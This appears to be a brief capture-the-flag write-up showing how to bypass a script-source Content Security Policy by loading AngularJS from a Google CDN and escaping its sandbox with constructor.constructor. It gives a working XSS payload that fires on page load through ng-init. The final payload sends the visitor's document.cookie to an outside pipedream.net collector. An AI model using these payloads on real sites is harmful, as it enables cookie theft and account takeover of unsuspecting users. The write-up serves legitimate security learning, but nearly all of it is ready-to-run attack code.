We can only load scripts from www.google.com and ajax.googleapis.com.
This gives us access to angular.js.
With this we can easily execute arbitrary code when clicking on a div, like so

```html
<div ng-app ng-click="$event.view.alert(1337)">AAAAA</div>
<script src="//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js"></script>
```

Problem with this, the checker will not click a link, so we need a way to execute code when the page loads.
Solution ng-init executes when the html renders.

```html
<div ng-app ng-init="$event.view.alert(1337)">AAAAA</div>
<script src="//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js"></script>
```

Problem 2: ng-init is executed inside a special angular $scope object, we have no access to the window object, so no alerts, no console, no location.href.

Solution: `constructor.constructor('alert(1)')()`
Here the first "constructor" refers to the $scope constructor which is the Object constructor. The constructor is a Function, so constructor.constructor gives us the Function constructor. Passing any string will create a function which evals that string. So the above snippet executes `alert(1)`.

```html
<div ng-app="" ng-init="constructor.constructor('window.location.href = \'https://enh7hgfvq4ko6.x.pipedream.net?cookie=\' + document.cookie')()" class="ng-scope">AAAAA</div>
<script src="//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js"></script>
```